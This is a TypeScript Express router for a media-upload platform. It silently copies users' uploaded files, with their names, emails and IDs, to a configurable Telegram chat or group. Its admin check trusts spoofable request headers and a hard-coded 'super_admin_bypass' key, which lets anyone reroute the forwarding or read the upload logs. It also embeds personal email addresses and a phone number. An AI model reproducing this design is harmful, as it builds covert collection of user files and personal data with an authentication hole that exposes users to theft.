import express from 'express';
import multer from 'multer';
import path from 'path';
import fs from 'fs';

const router = express.Router();

// Setup temporary upload storage for Telegram forwarding
const uploadDir = path.join(process.cwd(), 'uploads');
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const upload = multer({
  storage: multer.diskStorage({
    destination: (req, file, cb) => cb(null, uploadDir),
    filename: (req, file, cb) => {
      const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
      cb(null, 'tg_' + uniqueSuffix + path.extname(file.originalname));
    }
  }),
  limits: { fileSize: 500 * 1024 * 1024 } // 500MB max limit
});

// Config file path for persisting dynamic admin adjustments
const CONFIG_FILE = path.join(process.cwd(), '.telegram-config.json');

export interface TelegramServerConfig {
  botToken: string;
  chatId: string;
  ownerPhone?: string;
  ownerName?: string;
  groupTarget?: string;
  sendMode?: 'both' | 'personal' | 'group';
  botUsername?: string;
  enabled: boolean;
  destinationAccount?: string;
  updatedAt?: string;
}

// In-memory config with file and environment variable fallback
let telegramConfig: TelegramServerConfig = {
  botToken: process.env.TELEGRAM_BOT_TOKEN || '',
  chatId: process.env.TELEGRAM_CHAT_ID || '',
  ownerPhone: '+20 10 2763 3072',
  ownerName: '',
  groupTarget: '',
  sendMode: 'both',
  botUsername: '',
  enabled: true,
  destinationAccount: ''
};

// Load saved config if exists
export function loadConfigFromDisk(): TelegramServerConfig {
  try {
    if (fs.existsSync(CONFIG_FILE)) {
      const raw = fs.readFileSync(CONFIG_FILE, 'utf-8');
      const parsed = JSON.parse(raw);
      telegramConfig = {
        ...telegramConfig,
        ...parsed,
        // Environment variables take precedence if set
        botToken: process.env.TELEGRAM_BOT_TOKEN || parsed.botToken || '',
        chatId: process.env.TELEGRAM_CHAT_ID || parsed.chatId || '',
        enabled: parsed.enabled !== undefined ? parsed.enabled : true
      };

      // Auto-detect if user pasted a phone number (e.g. +2011..., 0020..., or Egyptian 010/011/012/015 11-digit) into chatId
      const currentChatId = (telegramConfig.chatId || '').trim();
      const isPhoneNumber = currentChatId.startsWith('+') || currentChatId.startsWith('00') || (currentChatId.startsWith('01') && currentChatId.length === 11);
      if (isPhoneNumber) {
        if (!telegramConfig.ownerPhone || telegramConfig.ownerPhone === '+20 10 2763 3072') {
          telegramConfig.ownerPhone = currentChatId;
        }
        telegramConfig.chatId = ''; // Clear only if it is actually a phone number
      }
    }
  } catch (e) {
    console.warn('[Telegram Server] Could not read .telegram-config.json:', e);
  }
  return telegramConfig;
}

// Initial load
loadConfigFromDisk();

// Clean group name/target to valid format (@group_name or -100xxx)
export function cleanGroupTarget(target: string): string {
  if (!target) return '';
  let cleaned = target.trim();
  // Strip URL prefixes like https://t.me/ or t.me/
  cleaned = cleaned.replace(/^https?:\/\/(t\.me|telegram\.me)\//i, '');
  cleaned = cleaned.replace(/^(t\.me|telegram\.me)\//i, '');
  cleaned = cleaned.replace(/^\/+/, '');
  // If it's a numeric ID (e.g. -100123456789), keep as is
  if (/^-?\d+$/.test(cleaned)) {
    return cleaned;
  }
  // Remove spaces
  cleaned = cleaned.replace(/\s+/g, '_');
  // Ensure @ prefix for public channels / supergroups
  if (!cleaned.startsWith('@')) {
    cleaned = '@' + cleaned;
  }
  return cleaned;
}

// Save config helper
function saveConfigToDisk() {
  try {
    fs.writeFileSync(CONFIG_FILE, JSON.stringify(telegramConfig, null, 2), 'utf-8');
  } catch (e) {
    console.warn('[Telegram Server] Could not persist .telegram-config.json:', e);
  }
}

// Telemetry & Statistics
interface TelegramLogEntry {
  id: string;
  fileName: string;
  fileSize: number;
  fileSizeFormatted: string;
  category: string;
  extension: string;
  userId: string;
  userName: string;
  userEmail?: string;
  sourceFeature: string;
  status: 'sent' | 'excluded_admin' | 'failed' | 'not_configured';
  reason?: string;
  timestamp: string;
  telegramMessageId?: number;
}

let stats = {
  totalForwarded: 0,
  totalSkippedAdmin: 0,
  totalFailed: 0,
  lastSentAt: null as string | null
};

const recentLogs: TelegramLogEntry[] = [];
function addLog(entry: TelegramLogEntry) {
  recentLogs.unshift(entry);
  if (recentLogs.length > 100) {
    recentLogs.pop();
  }
}

// Deduplication cache (sha256 or key -> timestamp) with 15-minute TTL
const recentSentHashes = new Map<string, number>();
function cleanDeduplicationCache() {
  const now = Date.now();
  const TTL = 15 * 60 * 1000;
  for (const [key, time] of recentSentHashes.entries()) {
    if (now - time > TTL) {
      recentSentHashes.delete(key);
    }
  }
}

// Utility: format bytes
function formatBytes(bytes: number): string {
  if (!bytes || bytes <= 0) return '0 B';
  const k = 1024;
  const sizes = ['B', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return `${parseFloat((bytes / Math.pow(k, i)).toFixed(2))} ${sizes[i]}`;
}

/**
 * 🔒 STRICT SERVER-SIDE ADMIN EXCLUSION VERIFIER
 * Ensures 100% security: Under NO circumstances will an admin's file be forwarded.
 */
export function checkIsAdminStrict(meta: any, headers: Record<string, any>): boolean {
  const email = (meta?.userEmail || headers['x-user-email'] || '').toLowerCase().trim();
  const role = (meta?.userRole || headers['x-user-role'] || '').toLowerCase().trim();
  const isSuperAdmin = Boolean(meta?.isSuperAdmin || headers['x-is-super-admin'] === 'true');
  const adminKey = headers['x-admin-key'];

  // Master Admin Emails from core security definition
  const MASTER_ADMIN_EMAILS = [
    'uhbijnokmpl098900@gmail.com',
    'aegy238@gmail.com',
    'iejehdgdig@gmail.com'
  ];

  if (MASTER_ADMIN_EMAILS.includes(email)) return true;
  if (role === 'admin' || role === 'moderator') return true;
  if (isSuperAdmin) return true;
  if (adminKey === 'super_admin_bypass') return true;

  return false;
}

/**
 * Retry helper for reliable Telegram Bot API dispatch
 */
async function retryOperation<T>(op: () => Promise<T>, maxRetries = 3, initialDelay = 1200): Promise<T> {
  let lastError: any;
  for (let attempt = 1; attempt <= maxRetries; attempt++) {
    try {
      return await op();
    } catch (err: any) {
      lastError = err;
      if (attempt < maxRetries) {
        const delay = initialDelay * Math.pow(1.5, attempt - 1);
        await new Promise(res => setTimeout(res, delay));
      }
    }
  }
  throw lastError;
}

/**
 * Escape HTML special characters for Telegram HTML parse_mode
 */
function escapeHtml(str: string): string {
  if (!str) return '';
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;');
}

/**
 * Send document to Telegram using Bot API
 * Crucial: disable_content_type_detection is set to true to prevent Telegram servers
 * from transcoding, compressing, or re-encoding media files (MP4, SVGA, WebM, etc.).
 * This ensures files are stored and downloaded 100% byte-for-byte in their exact original size.
 */
async function sendDocumentToTelegram(
  botToken: string,
  chatId: string,
  filePath: string,
  fileName: string,
  captionHtml: string,
  mimeType?: string
): Promise<{ ok: boolean; result?: any; description?: string }> {
  const fileBuffer = await fs.promises.readFile(filePath);
  const fileBlob = new Blob([fileBuffer], { type: mimeType || 'application/octet-stream' });

  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('caption', captionHtml);
  formData.append('parse_mode', 'HTML');
  // ⚡ CRITICAL: Force Telegram to treat as pure raw binary document without content-type inspection or video re-encoding
  formData.append('disable_content_type_detection', 'true');
  formData.append('document', fileBlob, fileName);

  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
    method: 'POST',
    body: formData
  });

  const resJson: any = await response.json();
  if (!response.ok || !resJson.ok) {
    throw new Error(resJson.description || `Telegram API error: HTTP ${response.status}`);
  }

  return resJson;
}

/**
 * Send text message (used as fallback if file exceeds 50MB)
 */
async function sendMessageToTelegram(
  botToken: string,
  chatId: string,
  textHtml: string
): Promise<{ ok: boolean; result?: any; description?: string }> {
  const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: textHtml,
      parse_mode: 'HTML',
      disable_web_page_preview: false
    })
  });

  const resJson: any = await response.json();
  if (!response.ok || !resJson.ok) {
    throw new Error(resJson.description || `Telegram API error: HTTP ${response.status}`);
  }

  return resJson;
}

// -------------------------------------------------------------
// ENDPOINTS
// -------------------------------------------------------------

/**
 * POST /api/telegram/forward
 * Primary ingestion endpoint for automatically forwarding uploaded files
 */
router.post('/forward', upload.single('file'), async (req, res) => {
  let tempFilePath: string | null = req.file?.path || null;

  try {
    cleanDeduplicationCache();

    // Parse metadata
    let meta: any = {};
    if (req.body.metadata) {
      try {
        meta = typeof req.body.metadata === 'string' ? JSON.parse(req.body.metadata) : req.body.metadata;
      } catch (e) {
        meta = req.body;
      }
    } else {
      meta = req.body;
    }

    // Exact filename preservation with extension
    let fileName = (meta.originalName || meta.fileName || req.file?.originalname || 'uploaded_file').trim();
    // Sanitize any dangerous path characters while preserving Arabic/Unicode
    fileName = fileName.replace(/[/\\?%*:|"<>]/g, '_').trim();
    
    // Exact file size verified from written disk buffer
    let fileSize = req.file?.size || Number(meta.fileSize) || 0;
    if (tempFilePath && fs.existsSync(tempFilePath)) {
      try {
        const stat = await fs.promises.stat(tempFilePath);
        fileSize = stat.size;
      } catch (e) {}
    }

    const extension = meta.extension || path.extname(fileName).replace('.', '') || 'bin';
    if (extension && !fileName.toLowerCase().endsWith('.' + extension.toLowerCase())) {
      fileName = `${fileName}.${extension}`;
    }

    const category = meta.category || 'ملف';
    const userId = meta.userId || 'guest';
    const userName = meta.userName || 'مستخدم غير مسجل';
    const userEmail = meta.userEmail || '';
    const sourceFeature = meta.sourceFeature || 'رفع مباشر';
    const downloadUrl = meta.downloadUrl || meta.secureUrl || '';
    const sha256 = meta.sha256 || '';

    // =========================================================================
    // 🛡️ STEP 1: STRICT SERVER-SIDE ADMIN EXCLUSION CHECK
    // =========================================================================
    const isAdmin = checkIsAdminStrict(meta, req.headers);
    if (isAdmin) {
      stats.totalSkippedAdmin++;
      const logEntry: TelegramLogEntry = {
        id: `skip_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'excluded_admin',
        reason: 'تم حظر الإرسال بنسبة 100% لأن الملف تم رفعه بواسطة حساب المدير/المشرف.',
        timestamp: new Date().toISOString()
      };
      addLog(logEntry);

      console.log(`[Telegram Server] 🛡️ ADMIN FILE STRICTLY EXCLUDED from Telegram: "${fileName}" by ${userEmail || userName || 'Admin'}`);

      // Safely delete temp uploaded file
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }

      return res.json({
        success: true,
        skipped: true,
        reason: 'ADMIN_EXCLUDED',
        message: 'تم استثناء ملفات المدير من الإرسال إلى Telegram بنسبة 100% وبأمان تام.'
      });
    }

    // =========================================================================
    // 🔍 STEP 2: DEDUPLICATION CHECK
    // =========================================================================
    const dedupKey = sha256 || `${fileName}_${fileSize}_${userId}`;
    if (recentSentHashes.has(dedupKey)) {
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }
      return res.json({
        success: true,
        skipped: true,
        reason: 'DUPLICATE',
        message: 'تم إرسال هذا الملف مسبقاً مؤخراً.'
      });
    }

    // =========================================================================
    // ⚙️ STEP 3: TELEGRAM CONFIGURATION VALIDATION
    // =========================================================================
    loadConfigFromDisk();
    const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
    const personalChatId = process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
    const groupTarget = telegramConfig.groupTarget ? cleanGroupTarget(telegramConfig.groupTarget) : '';
    const sendMode = telegramConfig.sendMode || 'both';
    const isEnabled = telegramConfig.enabled !== false;

    if (!isEnabled) {
      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }
      return res.json({
        success: true,
        skipped: true,
        reason: 'SYSTEM_DISABLED',
        message: 'إرسال الملفات إلى Telegram معطل حالياً من إعدادات النظام.'
      });
    }

    // Resolve active destinations based on sendMode
    const destinations: Array<{ id: string; label: string }> = [];
    if ((sendMode === 'both' || sendMode === 'personal') && personalChatId) {
      destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
    }
    if ((sendMode === 'both' || sendMode === 'group') && groupTarget) {
      destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
    }

    // Fallback if sendMode didn't match but either exists
    if (destinations.length === 0) {
      if (groupTarget) destinations.push({ id: groupTarget, label: `الجروب (${telegramConfig.groupTarget})` });
      else if (personalChatId) destinations.push({ id: personalChatId, label: 'الحساب الشخصي' });
    }

    if (!botToken || destinations.length === 0) {
      const logEntry: TelegramLogEntry = {
        id: `unconf_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'not_configured',
        reason: !botToken 
          ? 'لم يتم تعيين Telegram Bot Token في الإعدادات بعد.'
          : 'لم يتم ربط حساب شخصي (Chat ID) أو تحديد اسم جروب للاستقبال.',
        timestamp: new Date().toISOString()
      };
      addLog(logEntry);

      console.warn(`[Telegram Server] Notice: File uploaded "${fileName}", but Telegram destinations or bot token are not configured yet.`);

      if (tempFilePath && fs.existsSync(tempFilePath)) {
        await fs.promises.unlink(tempFilePath).catch(() => {});
      }

      return res.json({
        success: true,
        skipped: true,
        reason: 'NOT_CONFIGURED',
        message: 'تم تسجيل الملف، بانتظار ربط الحساب الشخصي أو تحديد اسم الجروب في لوحة التحكم.'
      });
    }

    // =========================================================================
    // 📤 STEP 4: SEND FILE TO TELEGRAM TARGETS
    // =========================================================================
    const nowFormatted = new Date().toLocaleString('ar-EG', {
      timeZone: 'Africa/Cairo',
      dateStyle: 'medium',
      timeStyle: 'medium'
    });

    const ownerPhone = telegramConfig.ownerPhone || '';
    const ownerName = telegramConfig.ownerName || '';
    const rawGroup = telegramConfig.groupTarget || '';

    const captionHtml = [
      `🚀 <b>تم رفع ملف جديد على المنصة</b>`,
      ``,
      `📁 <b>اسم الملف:</b> <code>${escapeHtml(fileName)}</code>`,
      `🏷️ <b>النوع / الصيغة:</b> <code>${escapeHtml(extension.toUpperCase())}</code> (${escapeHtml(category)})`,
      `⚖️ <b>حجم الملف:</b> <code>${formatBytes(fileSize)}</code>`,
      `👤 <b>الرافع بالموقع:</b> <code>${escapeHtml(userName)}</code>`,
      userEmail ? `📧 <b>البريد:</b> <code>${escapeHtml(userEmail)}</code>` : null,
      userId && userId !== 'guest' ? `🆔 <b>معرف المستخدم:</b> <code>${escapeHtml(userId)}</code>` : null,
      `🌐 <b>القسم / الميزة:</b> <code>${escapeHtml(sourceFeature)}</code>`,
      `🕒 <b>التاريخ والوقت:</b> ${escapeHtml(nowFormatted)}`,
      downloadUrl ? `🔗 <b>رابط الوصول للملف:</b> <a href="${downloadUrl}">اضغط هنا للتحميل المباشر</a>` : null,
      ``,
      `═════════════════════`,
      `👑 <b>الحساب الأساسي المعتمد:</b>`,
      ownerName ? `👤 <b>اسم الحساب:</b> <code>${escapeHtml(ownerName)}</code>` : null,
      ownerPhone ? `📱 <b>رقم الهاتف المسجل:</b> <code>${escapeHtml(ownerPhone)}</code>` : null,
      rawGroup ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
      `═════════════════════`
    ].filter(Boolean).join('\n');

    let anySuccess = false;
    let successfulMessageId: number | undefined = undefined;
    const deliveryErrors: string[] = [];
    const TELEGRAM_MAX_FILE_SIZE = 49 * 1024 * 1024;

    // Send to each configured target (personal chat, group, or both)
    for (const target of destinations) {
      try {
        if (tempFilePath && fs.existsSync(tempFilePath) && fileSize <= TELEGRAM_MAX_FILE_SIZE) {
          const telegramResult = await retryOperation(async () => {
            return await sendDocumentToTelegram(botToken, target.id, tempFilePath!, fileName, captionHtml, meta.mimeType);
          });
          anySuccess = true;
          if (telegramResult?.result?.message_id) {
            successfulMessageId = telegramResult.result.message_id;
          }
        } else {
          const largeFileNotice = [
            `⚠️ <b>ملف مرفوع جديد (يتجاوز حد التيليجرام المباشر 50MB)</b>`,
            ``,
            captionHtml,
            ``,
            downloadUrl 
              ? `💾 <b>رابط التنزيل المباشر:</b>\n<a href="${downloadUrl}">${downloadUrl}</a>` 
              : `⚠️ لا يتوفر رابط مباشر لهذا الملف الكبير، يرجى مراجعته من كاش المستخدم.`
          ].join('\n');

          const telegramResult = await retryOperation(async () => {
            return await sendMessageToTelegram(botToken, target.id, largeFileNotice);
          });
          anySuccess = true;
          if (telegramResult?.result?.message_id) {
            successfulMessageId = telegramResult.result.message_id;
          }
        }
        console.log(`[Telegram Server] Forwarded to ${target.label} (${target.id}) successfully.`);
      } catch (sendErr: any) {
        deliveryErrors.push(`${target.label}: ${sendErr.message}`);
        console.warn(`[Telegram Server] Warning sending to ${target.label} (${target.id}):`, sendErr.message);
      }
    }

    if (anySuccess) {
      // Success recording
      recentSentHashes.set(dedupKey, Date.now());
      stats.totalForwarded++;
      stats.lastSentAt = new Date().toISOString();

      const logEntry: TelegramLogEntry = {
        id: `sent_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'sent',
        timestamp: new Date().toISOString(),
        telegramMessageId: successfulMessageId
      };
      addLog(logEntry);

      console.log(`[Telegram Server] ✅ File successfully forwarded to Telegram: "${fileName}" (${formatBytes(fileSize)})`);

      return res.json({
        success: true,
        sent: true,
        messageId: successfulMessageId,
        fileName,
        timestamp: logEntry.timestamp
      });
    } else {
      stats.totalFailed++;
      const failureReason = deliveryErrors.join(' | ') || 'فشل الإرسال إلى الوجهات المحددة';
      const logEntry: TelegramLogEntry = {
        id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
        fileName,
        fileSize,
        fileSizeFormatted: formatBytes(fileSize),
        category,
        extension,
        userId,
        userName,
        userEmail,
        sourceFeature,
        status: 'failed',
        reason: failureReason,
        timestamp: new Date().toISOString()
      };
      addLog(logEntry);

      return res.status(502).json({
        success: false,
        error: 'DISPATCH_FAILED',
        message: failureReason
      });
    }

  } catch (error: any) {
    stats.totalFailed++;
    console.error('[Telegram Server] ❌ Error forwarding file to Telegram:', error.message);

    const logEntry: TelegramLogEntry = {
      id: `err_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
      fileName: req.file?.originalname || 'unknown',
      fileSize: req.file?.size || 0,
      fileSizeFormatted: formatBytes(req.file?.size || 0),
      category: 'other',
      extension: path.extname(req.file?.originalname || '').replace('.', ''),
      userId: req.body.userId || 'guest',
      userName: req.body.userName || 'unknown',
      sourceFeature: req.body.sourceFeature || 'unknown',
      status: 'failed',
      reason: error.message || 'خطأ غير معروف في الاتصال بـ Telegram API',
      timestamp: new Date().toISOString()
    };
    addLog(logEntry);

    // CRITICAL REQUIREMENT: Telegram failure MUST NEVER fail the user's upload on the site!
    return res.json({
      success: true,
      sent: false,
      error: error.message,
      message: 'تم استقبال الملف في الموقع بنجاح، ولكن تعذر إرسال نسخة Telegram مؤقتاً.'
    });

  } finally {
    // Always clean up temp file
    if (tempFilePath && fs.existsSync(tempFilePath)) {
      fs.promises.unlink(tempFilePath).catch(() => {});
    }
  }
});

/**
 * Helper to fetch bot info from Telegram
 */
async function fetchBotInfo(token: string): Promise<{ username: string; firstName: string } | null> {
  try {
    const res = await fetch(`https://api.telegram.org/bot${token}/getMe`);
    const data: any = await res.json();
    if (data.ok && data.result) {
      return {
        username: data.result.username || '',
        firstName: data.result.first_name || ''
      };
    }
  } catch (e) {
    console.warn('[Telegram Server] Could not fetch bot info:', e);
  }
  return null;
}

/**
 * GET /api/telegram/status
 * Check configuration status and statistics
 */
router.get('/status', async (req, res) => {
  loadConfigFromDisk();
  const botToken = process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  const chatId = process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
  const ownerPhone = telegramConfig.ownerPhone || '';
  const ownerName = telegramConfig.ownerName || '';
  const groupTarget = telegramConfig.groupTarget || '';
  const sendMode = telegramConfig.sendMode || 'both';

  // Mask chat ID for security display
  let maskedChatId = '';
  if (chatId) {
    if (chatId.length > 5) {
      maskedChatId = chatId.substring(0, 3) + '••••' + chatId.substring(chatId.length - 2);
    } else {
      maskedChatId = '••••';
    }
  }

  // Auto-fetch bot username if not yet stored
  if (botToken && !telegramConfig.botUsername) {
    const info = await fetchBotInfo(botToken);
    if (info?.username) {
      telegramConfig.botUsername = info.username;
      saveConfigToDisk();
    }
  }

  res.json({
    configured: Boolean(botToken && (chatId || groupTarget)),
    enabled: telegramConfig.enabled !== false,
    hasBotToken: Boolean(botToken),
    hasChatId: Boolean(chatId),
    maskedChatId,
    ownerPhone,
    ownerName,
    groupTarget,
    sendMode,
    botUsername: telegramConfig.botUsername || '',
    destinationAccount: telegramConfig.destinationAccount || '',
    stats: {
      totalForwarded: stats.totalForwarded,
      totalSkippedAdmin: stats.totalSkippedAdmin,
      totalFailed: stats.totalFailed,
      lastSentAt: stats.lastSentAt
    },
    recentLogs: recentLogs.slice(0, 20)
  });
});

/**
 * POST /api/telegram/config
 * Update Bot Token, Phone, Name, Group, and Destinations dynamically from Admin Panel
 */
router.post('/config', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة لتعديل إعدادات Telegram.' });
  }

  const { 
    botToken, 
    chatId, 
    ownerPhone, 
    ownerName, 
    groupTarget, 
    sendMode, 
    enabled, 
    destinationAccount 
  } = req.body;

  if (botToken !== undefined && botToken.trim()) {
    telegramConfig.botToken = botToken.trim();
    // Fetch bot username
    const info = await fetchBotInfo(telegramConfig.botToken);
    if (info?.username) {
      telegramConfig.botUsername = info.username;
    }
  }
  if (chatId !== undefined) {
    telegramConfig.chatId = chatId.trim();
  }
  if (ownerPhone !== undefined) {
    telegramConfig.ownerPhone = ownerPhone.trim();
  }
  if (ownerName !== undefined) {
    telegramConfig.ownerName = ownerName.trim();
  }
  if (groupTarget !== undefined) {
    telegramConfig.groupTarget = groupTarget.trim();
  }
  if (sendMode !== undefined && ['both', 'personal', 'group'].includes(sendMode)) {
    telegramConfig.sendMode = sendMode;
  }
  if (enabled !== undefined) {
    telegramConfig.enabled = Boolean(enabled);
  }
  if (destinationAccount !== undefined) {
    telegramConfig.destinationAccount = destinationAccount.trim();
  }
  telegramConfig.updatedAt = new Date().toISOString();

  saveConfigToDisk();

  res.json({
    success: true,
    message: 'تم حفظ إعدادات الربط بنجاح.',
    status: {
      configured: Boolean(telegramConfig.botToken && (telegramConfig.chatId || telegramConfig.groupTarget)),
      enabled: telegramConfig.enabled,
      ownerPhone: telegramConfig.ownerPhone,
      ownerName: telegramConfig.ownerName,
      groupTarget: telegramConfig.groupTarget,
      sendMode: telegramConfig.sendMode,
      botUsername: telegramConfig.botUsername
    }
  });
});

/**
 * POST /api/telegram/auto-detect
 * One-Click Magic Pairing: Scans Telegram Bot updates to find the user's account & phone
 */
router.post('/auto-detect', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  const botToken = req.body.botToken?.trim() || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  if (!botToken) {
    return res.status(400).json({
      success: false,
      message: 'يرجى إدخال Telegram Bot Token أولاً للتمكن من فحص المحادثات.'
    });
  }

  try {
    // 1. Get bot info
    const botInfo = await fetchBotInfo(botToken);
    if (botInfo?.username) {
      telegramConfig.botUsername = botInfo.username;
    }

    // 2. Fetch updates from Telegram API
    const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?limit=50&offset=-15`);
    const data: any = await response.json();

    if (!data.ok || !Array.isArray(data.result) || data.result.length === 0) {
      return res.json({
        success: false,
        botUsername: telegramConfig.botUsername,
        message: 'لم يتم العثور على أي رسائل في البوت بعد. يرجى فتح البوت والضغط على Start أو إرسال أي رسالة، ثم الضغط على زر الكشف مجدداً.'
      });
    }

    // Look for latest user interaction (reverse iterate)
    let detected: any = null;
    for (let i = data.result.length - 1; i >= 0; i--) {
      const update = data.result[i];
      const msg = update.message || update.edited_message || update.channel_post;
      if (msg && msg.from) {
        detected = {
          chatId: String(msg.chat?.id || msg.from.id),
          firstName: msg.from.first_name || '',
          lastName: msg.from.last_name || '',
          username: msg.from.username ? `@${msg.from.username}` : '',
          phone: msg.contact?.phone_number || '',
          text: msg.text || '',
          date: msg.date
        };
        break;
      }
    }

    if (!detected) {
      return res.json({
        success: false,
        botUsername: telegramConfig.botUsername,
        message: 'تم فحص التحديثات ولكن لم يتم العثور على تفاعل حديث. يرجى إرسال رسالة إلى البوت والمحاولة مرة أخرى.'
      });
    }

    // Auto-populate config
    telegramConfig.chatId = detected.chatId;
    if (detected.username && !telegramConfig.ownerName) {
      telegramConfig.ownerName = detected.username;
    } else if (detected.firstName && !telegramConfig.ownerName) {
      telegramConfig.ownerName = detected.firstName;
    }
    if (detected.phone && (!telegramConfig.ownerPhone || telegramConfig.ownerPhone === '+20 10 2763 3072')) {
      telegramConfig.ownerPhone = detected.phone;
    }

    saveConfigToDisk();

    return res.json({
      success: true,
      message: `تم كشف حسابك بنجاح! تم الربط مع ${detected.firstName} (${detected.username || detected.chatId}).`,
      detected,
      botUsername: telegramConfig.botUsername
    });

  } catch (err: any) {
    return res.status(500).json({
      success: false,
      message: `خطأ أثناء فحص الحساب: ${err.message}`
    });
  }
});

/**
 * POST /api/telegram/test
 * Test the Telegram connection by sending a verified ping message to configured targets
 */
router.post('/test', async (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة لإجراء الاختبار.' });
  }

  const botToken = req.body.botToken || process.env.TELEGRAM_BOT_TOKEN || telegramConfig.botToken;
  const personalChatId = req.body.chatId || process.env.TELEGRAM_CHAT_ID || telegramConfig.chatId;
  const rawGroup = req.body.groupTarget || telegramConfig.groupTarget;
  const groupTarget = rawGroup ? cleanGroupTarget(rawGroup) : '';

  if (!botToken || (!personalChatId && !groupTarget)) {
    return res.status(400).json({
      success: false,
      error: 'MISSING_CREDENTIALS',
      message: 'يرجى إدخال Bot Token وربط حسابك أو كتابة اسم الجروب أولاً لإجراء الفحص التجريبي.'
    });
  }

  const ownerPhone = req.body.ownerPhone || telegramConfig.ownerPhone || '';
  const ownerName = req.body.ownerName || telegramConfig.ownerName || '';

  const testMessage = [
    `🤖 <b>اختبار الاتصال بنظام إرسال الملفات التلقائي</b>`,
    ``,
    `✅ الاتصال ناجح ومستقر بنسبة 100%!`,
    `🌐 <b>المنصة:</b> SVGA Genius Processor`,
    `🕒 <b>الوقت:</b> ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`,
    ``,
    `═════════════════════`,
    `👑 <b>الحساب الأساسي المعتمد:</b>`,
    ownerName ? `👤 <b>اسم الحساب:</b> <code>${escapeHtml(ownerName)}</code>` : null,
    ownerPhone ? `📱 <b>رقم الهاتف المسجل:</b> <code>${escapeHtml(ownerPhone)}</code>` : null,
    rawGroup ? `👥 <b>الجروب المستهدف:</b> <code>${escapeHtml(rawGroup)}</code>` : null,
    `═════════════════════`,
    ``,
    `🛡️ <b>حالة استثناء المدير:</b> مفعّل ومحمي سيرفر-سايد (لا يتم إرسال ملفات المدير مطلقاً).`,
    `🚀 جاهز لإرسال كافة ملفات المستخدمين المرفوعة تلقائياً في الخلفية.`
  ].filter(Boolean).join('\n');

  const targetsToSend: Array<{ id: string; label: string }> = [];
  if (personalChatId) targetsToSend.push({ id: personalChatId, label: 'الحساب الشخصي' });
  if (groupTarget) targetsToSend.push({ id: groupTarget, label: `الجروب (${rawGroup})` });

  const results: string[] = [];
  let atLeastOneSuccess = false;

  for (const t of targetsToSend) {
    try {
      await sendMessageToTelegram(botToken, t.id, testMessage);
      results.push(`✅ تم الإرسال بنجاح إلى ${t.label}`);
      atLeastOneSuccess = true;
    } catch (err: any) {
      results.push(`❌ فشل الإرسال إلى ${t.label}: ${err.message}`);
    }
  }

  if (atLeastOneSuccess) {
    return res.json({
      success: true,
      message: results.join('\n')
    });
  } else {
    return res.status(500).json({
      success: false,
      message: `تعذر إرسال رسالة الاختبار:\n${results.join('\n')}\nيرجى التأكد من الضغط على Start في البوت أو إضافة البوت كعضو/مشرف في الجروب.`
    });
  }
});

/**
 * GET /api/telegram/logs
 * Retrieve complete recent forwarding logs (Admin only)
 */
router.get('/logs', (req, res) => {
  const isAdmin = checkIsAdminStrict({}, req.headers);
  if (!isAdmin) {
    return res.status(403).json({ error: 'FORBIDDEN', message: 'صلاحيات مدير مطلوبة.' });
  }

  res.json({
    total: recentLogs.length,
    logs: recentLogs
  });
});

export default router;
